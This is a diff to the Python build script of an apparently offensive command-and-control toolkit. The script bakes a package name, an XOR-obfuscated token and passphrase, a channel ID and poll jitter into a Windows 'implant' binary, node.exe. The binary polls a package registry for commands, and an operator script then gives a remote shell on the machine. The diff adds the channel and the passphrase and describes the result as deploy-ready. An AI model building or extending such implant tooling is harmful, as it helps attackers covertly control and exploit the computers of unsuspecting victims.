@@ -2,15 +2,17 @@
 """One command from a config file to a deploy-ready node.exe.
 
     cp c2.example.json c2.json     # fill in token + package
-    python3 make.py                # -> dist/node.exe (no arguments needed)
+    python3 make.py                # -> native/dist/node.exe
 
-Everything the binary needs is baked in: registry, package, token, poll timing.
-The token is XOR-obfuscated; the package name is public by nature.
+Everything the binary needs is baked in: registry, package, token, channel,
+passphrase and poll timing. The token and the passphrase are XOR-obfuscated;
+the package name is public by nature.
 """
 from __future__ import annotations
 
 import json
 import os
+import re
 import subprocess
 import sys
 
@@ -20,6 +22,8 @@ sys.path.insert(0, os.path.join(HERE, "src"))
 DEFAULTS = {
     "package": "",
     "token": "",
+    "channel": "c0ff",
+    "passphrase": "",
     "interval": 60,
     "jitter": 20,
     "name": "node",
@@ -45,6 +49,8 @@ def load_config(path):
     if not merged["token"]:
         print("[!] no token in the config: the implant will execute but not "
               "reply. Add one for a usable channel.", file=sys.stderr)
+    if not re.fullmatch(r"[a-f][0-9a-f]{3}", merged["channel"]):
+        raise SystemExit(f"{path}: 'channel' must be 4 chars, first one a-f")
     return merged
 
 
@@ -54,11 +60,14 @@ def main():
 
     cmd = [sys.executable, os.path.join(HERE, "native", "build_go.py"),
            "-p", cfg["package"],
+           "--stage-chan", cfg["channel"],
            "--interval", str(cfg["interval"]),
            "--jitter", str(cfg["jitter"]),
            "--name", cfg["name"]]
     if cfg["token"]:
         cmd += ["-t", cfg["token"]]
+    if cfg["passphrase"]:
+        cmd += ["--passphrase", cfg["passphrase"]]
     if cfg.get("registry"):
         cmd += ["--api-base", cfg["registry"]]
     if cfg.get("arch") in ("both", "386", "x86"):
@@ -66,9 +75,12 @@ def main():
     if cfg.get("upx"):
         cmd.append("--upx")
 
-    print(f"[*] package={cfg['package']} interval={cfg['interval']}s "
-          f"jitter={cfg['jitter']}s arch={cfg['arch']}")
-    print(f"[*] token={'embedded' if cfg['token'] else 'NONE'} upx={bool(cfg.get('upx'))}")
+    print(f"[*] package={cfg['package']} channel={cfg['channel']} "
+          f"interval={cfg['interval']}s jitter={cfg['jitter']}s "
+          f"arch={cfg['arch']}")
+    print(f"[*] token={'embedded' if cfg['token'] else 'NONE'} "
+          f"passphrase={'set' if cfg['passphrase'] else 'NONE'} "
+          f"upx={bool(cfg.get('upx'))}")
     p = subprocess.run(cmd, capture_output=True, text=True)
     sys.stdout.write(p.stdout)
     if p.returncode != 0:
@@ -84,7 +96,8 @@ def main():
             print(f"    {os.path.join(dist, name)}  ({size:,} bytes)")
     print()
     print("    Run it with no arguments; it polls on its own.")
-    print(f"    Operate it with: npm-c2 operator -p {cfg['package']} -t <token> shell")
+    print(f"    Operate it with: C2_PKG={cfg['package']} "
+          f"C2_CHAN={cfg['channel']} ./c2.sh")
     return 0
 
 
